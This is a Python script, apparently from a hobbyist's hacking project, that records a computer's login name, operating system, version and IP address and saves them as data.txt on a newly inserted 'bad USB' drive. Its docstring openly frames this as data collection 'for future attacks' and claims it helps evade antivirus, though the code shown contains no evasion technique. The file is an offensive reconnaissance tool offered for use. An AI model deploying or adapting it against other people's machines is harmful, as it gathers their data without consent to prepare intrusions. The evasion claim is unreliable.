import os
import sys
import subprocess
import platform
from colorama import Fore, Style, init
import socket
import platform
import time
import psutil



"""
This program was made to gather information from the target computer such as: 
name, system, version, IP, for future attacks.
In other words, the most important part of a hack can simply be data collection, so here we make data collection easier and store it in the file data.txt, which will be saved directly on your bad USB.
The script was created to facilitate antivirus detection evasion, just connect your bad USB, and it will do the job for you.

Hyimjamal - I like to learn and I am enthusiastic about hacking
"""

# Initialize colorama for colored output
init(autoreset=True)

def detect_usb():
    """Detects USB insertion and returns its mount point."""
    system = platform.system()

    if system == "Linux":
        usb_path = "/media/"  # Change if needed
        print("Waiting for USB drive...")

        initial_drives = set(os.listdir(usb_path))

        while True:
            time.sleep(2)
            current_drives = set(os.listdir(usb_path))
            new_drives = current_drives - initial_drives  # Detect new USB

            if new_drives:
                for drive in new_drives:
                    mount_point = os.path.join(usb_path, drive)
                    print(f"USB inserted: {mount_point}")
                    return mount_point  # Return USB mount path

            initial_drives = current_drives

    elif system == "Windows":
        print("Waiting for USB drive...")

        def get_usb_drives():
            """Returns a dictionary of connected USB drives with mount points."""
            return {disk.device: disk.mountpoint for disk in psutil.disk_partitions() if 'removable' in disk.opts}

        initial_drives = get_usb_drives()

        while True:
            time.sleep(2)
            current_drives = get_usb_drives()
            new_drives = {dev: path for dev, path in current_drives.items() if dev not in initial_drives}

            if new_drives:
                for dev, path in new_drives.items():
                    print(f"USB inserted: {path}")
                    return path  # Return USB mount path

            initial_drives = current_drives


def main():
    """Collects system info and saves it to a file on the USB drive."""
    system_info = (
        f"{Fore.GREEN}Username: {os.getlogin()}\n"
        f"System: {platform.system()}\n"
        f"Version: {platform.version()}"
    )
    print(system_info)

    # Get the device's IP address
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    print(f"IP: {ip_address}")

    # Detect USB and get its path
    usb_mount_path = detect_usb()

    # Create the full string to save in the file
    data_to_save = f"{system_info}\nIP: {ip_address}"

    # Save the information in the USB drive
    if usb_mount_path:
        file_path = os.path.join(usb_mount_path, "data.txt")
        try:
            with open(file_path, "w") as thedata:
                thedata.write(data_to_save)
            print(f"Information saved to {file_path}")
        except Exception as e:
            print(f"Error saving file: {e}")

if __name__ == "__main__":
    main()
